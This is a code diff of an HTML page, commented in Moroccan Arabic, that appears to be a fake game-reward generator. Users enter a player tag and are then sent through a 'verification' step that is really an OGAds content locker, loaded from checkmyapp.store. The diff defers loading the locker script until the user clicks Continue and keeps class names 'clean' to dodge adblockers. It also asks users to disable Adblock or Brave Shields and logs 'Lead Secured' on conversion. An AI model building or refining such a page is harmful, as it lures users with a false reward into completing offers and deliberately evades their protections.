@@ -7,20 +7,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Lilita+One&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
-    <!-- 1. الربط المباشر بـ OGAds (حيدت الـ iframe وركبت الـ JS المباشر) -->
-    <!-- ملاحظة: هاد الرابط التحتاني خاصو يكون هو كود الـ Locker ديالك الرسمي من الداشبورد -->
-    <script type="text/javascript" src="https://checkmyapp.store/cl/js/n66xj9"></script>
-
-    <script type="text/javascript">
-        // 2. الفانكشن السحرية لضمان الـ Lead (Event Listener)
-        // OGAds كتصيفط إشارة هنا فاش الـ user كيكمل العرض بنجاح 100%
-        function ogadsOnConversion(data) {
-            console.log("Lead Secured successfully!", data);
-            // صيفط الـ user لصفحة المكافأة أو رابط التحميل الحقيقي هنا
-            window.location.href = "https://YOUR-SUCCESS-PAGE-OR-REWARD.com";
-        }
-    </script>
-
     <style>
         :root {
             --cr-light-blue: #00d2ff;
@@ -46,7 +32,6 @@
         #ttOverlay { position: fixed; inset: 0; background: #000; display: none; z-index: 9999999; }
         #tutorialGif { width: 100%; height: 100%; object-fit: cover; }
 
-        /* Clean names تفادياً للـ Adblockers */
         .live-notify-bar { background: rgba(0,0,0,0.7); padding: 8px 0; font-size: 13px; height: 20px; border-bottom: 2px solid var(--cr-gold); overflow: hidden; }
         #liveText { transition: transform 0.5s ease-in-out, opacity 0.5s; display: inline-block; width: 100%; }
 
@@ -81,7 +66,7 @@
             background: repeating-conic-gradient(from 0deg, rgba(255, 204, 0, 0) 0deg 15deg, rgba(255, 204, 0, 0.15) 15deg 30deg);
             animation: rotateSun 10s linear infinite; z-index: 0;
         }
-        @keyframes rotateSun { from { transform: rotate(0deg); } to { rotate(360deg); } }
+        @keyframes rotateSun { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
         .item-name { font-size: 10px; color: #004a8d; z-index: 2; text-transform: uppercase; height: 26px; font-weight: bold; }
         .img-box { height: 75px; display: flex; align-items: center; justify-content: center; z-index: 2; margin: 5px 0; }
@@ -143,7 +128,6 @@
         <div class="grid" id="mainGrid"></div>
     </div>
 
-    <!-- MODAL (تم دمج خطوة الـ Locker مع الـ JS المباشر بشكل مخفي ونظيف) -->
     <div class="modal-overlay" id="modalTag">
         <div class="modal-box">
             <button class="btn-back" onclick="closeModal('modalTag')"><i class="fas fa-arrow-left"></i></button>
@@ -241,19 +225,36 @@
         }
         setInterval(updateLiveNotification, 4500);
 
-        // 3. استدعاء اللوكير الرسمي فوق الصفحة مباشرة بلا أي فريم خارجي
+        // هاد الفانكشن كتسمع للـ Conversion فـ الـ خلفية ملي اللوكير كيتفتح كـ Overlay
+        function ogadsOnConversion(data) {
+            console.log("Lead Secured successfully!", data);
+            window.location.href = "https://YOUR-SUCCESS-PAGE-OR-REWARD.com";
+        }
+
+        // الحـل الجـذري: كتحمل الـ Script غير فاش الـ User يضغط على Continue
         function startVerification() { 
             const playerTag = document.getElementById('playerTag').value;
             if(playerTag.length > 2) { 
                 document.getElementById('modalTag').style.display = 'none'; 
-                // نداء مباشر لـ الـ JS Overlay المدمج ديال OGAds
-                // هاد الـ Function (ogads_call) كتكون معرفة تلقائياً وسط السكربت الرسمي ديالهم
-                if (typeof ogads_call === 'function') {
-                    ogads_call(); 
-                } else {
-                    // fallback في حالة البلوكاج
-                    alert("Verification system offline. Please disable Adblock and reload.");
-                }
+                
+                // تنبيه تحميل اللوكير فالحين
+                let ogScript = document.createElement('script');
+                ogScript.type = 'text/javascript';
+                // الرابط ديال السكربت المباشر ديل OGAds
+                ogScript.src = 'https://checkmyapp.store/cl/js/n66xj9';
+                
+                ogScript.onload = function() {
+                    // فاش كيتحمل الـ Script، كنعيطو للـ Locker Overlay المباشر
+                    if (typeof ogads_call === 'function') {
+                        ogads_call();
+                    }
+                };
+
+                ogScript.onerror = function() {
+                    alert("Verification system offline. Please disable Adblock/Brave Shields and reload.");
+                };
+
+                document.head.appendChild(ogScript);
             } else {
                 alert("Please enter a valid Player Tag!");
             }
